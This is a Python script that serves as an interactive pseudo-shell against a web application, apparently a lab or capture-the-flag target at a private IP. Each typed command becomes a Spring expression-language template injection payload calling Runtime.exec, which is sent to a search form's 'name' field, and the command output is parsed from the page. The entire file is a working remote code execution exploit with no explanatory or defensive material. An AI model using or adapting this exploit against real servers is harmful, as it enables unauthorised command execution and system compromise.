#!/usr/bin/env python3
import requests
import subprocess

subprocess.call('clear', shell=True)
while True:
	## Check for Exit Conditions ##
	command = input("hackt$ ")
	if command.upper() == "EXIT":
		exit()
	elif command == "clear":
		## clears the screen when the command "clear" is provided ## 
		subprocess.call('clear', shell=True)
	else:
        ## Construct Payload ##
		payload = "" 
		commandlen = len(command)
		payload += "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("
		for i in range (0, commandlen):
			if i == (commandlen-1):
				payload += "T(java.lang.Character).toString("+str(ord(command[i]))+"))).getInputStream())}"
			elif i > 0 and i < (commandlen-1):
				payload += "T(java.lang.Character).toString("+str(ord(command[i]))+")).concat("
			else:
				payload += "T(java.lang.Character).toString("+str(ord(command[i]))+").concat("
		try:
			r = requests.post("http://10.10.11.170:8080/search", data={"name":payload})
		except:
			print ("Could not connect to host")
        
		## Format Response ## 
		response = r.text
		response = response.split("You searched for: ")[1]
		response = response.split("</h2>")[0]
		print (response)
